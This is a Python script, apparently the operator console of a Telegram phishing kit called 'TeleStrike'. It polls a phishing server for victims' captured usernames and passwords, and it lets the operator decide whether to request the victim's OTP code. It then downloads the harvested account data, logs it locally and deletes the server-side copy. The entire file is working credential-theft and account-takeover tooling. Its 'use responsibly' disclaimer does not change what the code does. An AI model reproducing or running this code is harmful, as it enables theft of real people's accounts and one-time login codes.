import time
import requests
from datetime import datetime

print('''
\033[36m
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣾⣿⣿⣿⡄
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣿⣿⡿⠿⠛⢙⣿⣿⠃
    ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣶⣾⣿⣿⠿⠛⠋⠁⠀⠀⠀⣸⣿⣿⠀
    ⠀⠀⠀⠀⣀⣤⣴⣾⣿⣿⡿⠟⠛⠉⠀⠀⣠⣤⠞⠁⠀⠀⣿⣿⡇⠀
    ⠀⣴⣾⣿⣿⡿⠿⠛⠉⠀⠀⠀⢀⣠⣶⣿⠟⠁⠀⠀⠀⢸⣿⣿⠀⠀
    ⠸⣿⣿⣿⣧⣄⣀⠀⠀⣀⣴⣾⣿⣿⠟⠁⠀⠀⠀⠀⠀⣼⣿⡿⠀⠀
    ⠀⠈⠙⠻⠿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⢠⣿⣿⠇⠀⠀
    ⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⡇⠀⣀⣄⡀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣠⣾⣿⣿⣿⣦⡀⠀⠀⣿⣿⡏⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⡿⠋⠈⠻⣿⣿⣦⣸⣿⣿⠁⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠁⠀⠀⠀⠀⠈⠻⣿⣿⣿⠏⠀⠀⠀⠀

\033[36m| \033[37mTeleStrike
\033[36m| \033[31mWarning\033[37m: Use responsibly. The creator is not liable for illegal use.
\033[36m| \033[37mTelegram: @er4vnn       Github: https://github.com/er4vn
''')

# فقط دریافت لینک پایه از کاربر
base_url = input("\033[37mEnter the source code file URL(e.g. http://localhost/telegram/):\033[0m ").strip().rstrip('/') + '/'

# ساخت لینک‌های کامل
user_file = base_url + "user.txt"
decision_url = base_url + "save_decision.php"
file_url = base_url + "userinfo.txt"
delete_url = base_url + "delete_data.php"

print("\n\033[32m[+] Wait for a user to fall into the trap...\033[0m")

last_data = ""

while True:
    try:
        response = requests.get(user_file)
        if response.status_code == 200:
            data = response.text.strip()
            if data and data != last_data:
                print("\n\033[36m[!] User Detection\033[0m")
                print(data.replace("Email:", "Username:").replace("Password:", "Password:"))
                choice = input("Can I receive the OTP code? (y/n) > ").strip().lower()
                requests.post(decision_url, data={"decision": choice})
                last_data = data
                print("\033[34mPlease wait to receive the information, it will take about one minute...\033[0m")
                time.sleep(35)

                response = requests.get(file_url)
                if response.status_code == 200:
                    with open('userinfo.txt', 'wb') as f:
                        f.write(response.content)
                    print("\033[32mFile downloaded successfully. (all_users.txt)\033[0m")

                    with open('userinfo.txt', 'r', encoding='utf-8') as f:
                        user_info = f.read()

                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    with open("all_users.txt", "a", encoding="utf-8") as log:
                        log.write(f"{user_info.strip()}\nTime: {timestamp}\n{'-'*40}\n")

                    time.sleep(3)
                    delete_response = requests.get(delete_url)
                    print("Delete response:", delete_response.text)
                else:
                    print("\033[31mFailed to download the file.\033[0m")
    except Exception as e:
        print(f"\033[31mError: {e}\033[0m")
    time.sleep(2)
